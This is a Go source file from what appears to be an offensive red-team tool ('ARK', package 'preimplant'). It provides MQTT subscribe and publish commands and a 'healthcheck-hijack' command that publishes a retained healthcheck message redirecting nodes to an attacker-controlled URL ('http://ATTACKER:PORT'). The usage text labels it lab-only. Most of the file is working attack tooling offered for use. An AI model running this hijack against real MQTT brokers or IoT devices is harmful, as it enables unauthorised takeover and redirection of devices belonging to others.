package preimplant

import (
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/KKingZero/ARK/pkg/mqttcli"
)

// RunMQTT dispatches: sub | pub | healthcheck-hijack
func RunMQTT(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", mqttUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(mqttUsage)
		return nil
	case "sub":
		return mqttSub(args[1:])
	case "pub":
		return mqttPub(args[1:])
	case "healthcheck-hijack", "hijack":
		return mqttHijack(args[1:])
	default:
		return fmt.Errorf("unknown mqtt command %q\n%s", args[0], mqttUsage)
	}
}

const mqttUsage = `ark mqtt — operator-local MQTT (no teamserver)

  ark mqtt sub --host H [--port 1883] [--topic '#'] [--seconds 20]
  ark mqtt pub --host H --topic T --payload '…' [--retain] [--qos 0|1]
  ark mqtt healthcheck-hijack --host H --topic T --url http://ATTACKER:PORT \
      [--node node-6] [--ip 172.16.20.10] [--port 1883]

Lab-only. See docs/OPERATOR_PRE_IMPLANT.md
`

func mqttOpts(f map[string]string) (mqttcli.Options, error) {
	host := f["host"]
	if host == "" {
		return mqttcli.Options{}, fmt.Errorf("--host is required")
	}
	port := 1883
	if f["port"] != "" {
		p, err := strconv.Atoi(f["port"])
		if err != nil {
			return mqttcli.Options{}, fmt.Errorf("--port: %w", err)
		}
		port = p
	}
	return mqttcli.Options{
		Host:     host,
		Port:     port,
		Username: f["user"],
		Password: f["pass"],
	}, nil
}

func mqttSub(args []string) error {
	f, _ := ParseFlags(args)
	o, err := mqttOpts(f)
	if err != nil {
		return err
	}
	topic := f["topic"]
	if topic == "" {
		topic = "#"
	}
	sec := 20
	if f["seconds"] != "" {
		sec, err = strconv.Atoi(f["seconds"])
		if err != nil {
			return err
		}
	}
	return mqttcli.Subscribe(o, topic, time.Duration(sec)*time.Second, os.Stdout)
}

func mqttPub(args []string) error {
	f, _ := ParseFlags(args)
	o, err := mqttOpts(f)
	if err != nil {
		return err
	}
	topic := f["topic"]
	payload := f["payload"]
	if topic == "" || payload == "" {
		return fmt.Errorf("usage: mqtt pub --host H --topic T --payload '…' [--retain]")
	}
	qos := byte(0)
	if f["qos"] == "1" {
		qos = 1
	}
	retain := f["retain"] == "1"
	if err := mqttcli.Publish(o, topic, []byte(payload), retain, qos); err != nil {
		return err
	}
	fmt.Printf("[mqtt] published topic=%s retain=%v qos=%d bytes=%d\n", topic, retain, qos, len(payload))
	return nil
}

func mqttHijack(args []string) error {
	f, _ := ParseFlags(args)
	o, err := mqttOpts(f)
	if err != nil {
		return err
	}
	topic := f["topic"]
	u := f["url"]
	if topic == "" || u == "" {
		return fmt.Errorf("usage: mqtt healthcheck-hijack --host H --topic T --url http://ATTACKER:PORT")
	}
	body, err := mqttcli.BuildHealthcheckJSON(mqttcli.HealthcheckOptions{
		URL:  u,
		Node: f["node"],
		IP:   f["ip"],
	})
	if err != nil {
		return err
	}
	if err := mqttcli.Publish(o, topic, body, true, 1); err != nil {
		return err
	}
	fmt.Printf("[mqtt] healthcheck-hijack retain-published\n  topic=%s\n  url=%s\n  payload=%s\n", topic, u, string(body))
	return nil
}
